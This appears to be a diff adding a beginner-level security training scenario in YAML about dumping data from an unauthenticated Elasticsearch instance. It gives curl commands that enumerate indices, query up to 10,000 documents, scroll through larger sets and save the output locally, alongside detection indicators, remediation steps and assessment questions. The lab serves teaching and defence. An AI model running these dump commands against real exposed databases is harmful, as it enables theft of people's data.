@@ -1,0 +1,100 @@
+# Category: Database Security
+name: "Elasticsearch Unauthenticated Access – Data Exfiltration"
+id: "database-elasticsearch-unauth-001"
+category: "database_security"
+subcategory: "elasticsearch"
+difficulty: "beginner"
+estimated_time: "40 minutes"
+
+description: |
+  Access an unauthenticated Elasticsearch instance and query its indices
+  to exfiltrate sensitive documents, logs, and application data. Often used
+  as a discovery phase for later attacks.
+
+learning_objectives:
+  - Understand Elasticsearch REST API
+  - Enumerate indices and mapping
+  - Query all documents from an index
+  - Use `_search` with `size` to dump data
+
+tools:
+  - curl
+  - Elasticsearch head (web plugin)
+  - Python (elasticsearch-py)
+
+prerequisites:
+  - Elasticsearch exposed on port 9200
+  - No authentication required
+
+steps:
+  - id: "step1"
+    phase: "discovery"
+    action: "Get cluster info"
+    commands:
+      - "# Get cluster health"
+      - "curl http://<TARGET_IP>:9200/_cluster/health"
+      - "# List indices"
+      - "curl http://<TARGET_IP>:9200/_cat/indices?v"
+    expected_output: "List of indices with documents"
+    detection: "Elasticsearch logs show /_cluster/health and /_cat/indices"
+
+  - id: "step2"
+    phase: "data_extraction"
+    action: "Query all documents from a chosen index"
+    commands:
+      - "# Get mapping to know fields"
+      - "curl http://<TARGET_IP>:9200/index_name/_mapping"
+      - "# Query all documents (max 10000)"
+      - "curl -X GET 'http://<TARGET_IP>:9200/index_name/_search?size=10000'"
+      - "# Use scroll for large datasets"
+      - "curl -X GET 'http://<TARGET_IP>:9200/index_name/_search?scroll=1m' -d '{\"size\": 1000}'"
+    expected_output: "JSON containing documents (logs, user data, etc.)"
+    detection: "Large data transfer; search queries in logs"
+
+  - id: "step3"
+    phase: "exfil"
+    action: "Save data locally"
+    commands:
+      - "# Pipe to file"
+      - "curl http://<TARGET_IP>:9200/index_name/_search?size=10000 > data.json"
+    expected_output: "Data saved"
+    detection: "Network egress for large file"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1530"
+    description: "Data from Cloud Storage Object (similar for on‑prem)"
+  - standard: "NIST SP 800-53"
+    control: "SI-4"
+    description: "Monitoring (logs should be protected)"
+
+detection:
+  network_indicators:
+    - "Traffic to 9200 from unusual IPs"
+  log_indicators:
+    - "Elasticsearch logs with `_search` and `_scroll`"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Enable authentication (X‑Pack Security)"
+    - "Use IP filtering on Elasticsearch port"
+  long_term:
+    - "Implement TLS and role‑based access"
+    - "Monitor for anomalous queries"
+
+variables:
+  target_ip: "10.0.0.20"
+  index_name: "logs-*"
+
+assessment_questions:
+  - "What Elasticsearch API endpoint lists all indices?"
+  - "How can you paginate search results in Elasticsearch?"
+  - "Why is it dangerous to expose Elasticsearch publicly?"
+
+references:
+  - url: "https://www.elastic.co/guide/en/elasticsearch/reference/current/security.html"
+    title: "Elasticsearch Security"
+  - url: "https://www.elastic.co/guide/en/elasticsearch/reference/current/search.html"
+    title: "Elasticsearch Search API"
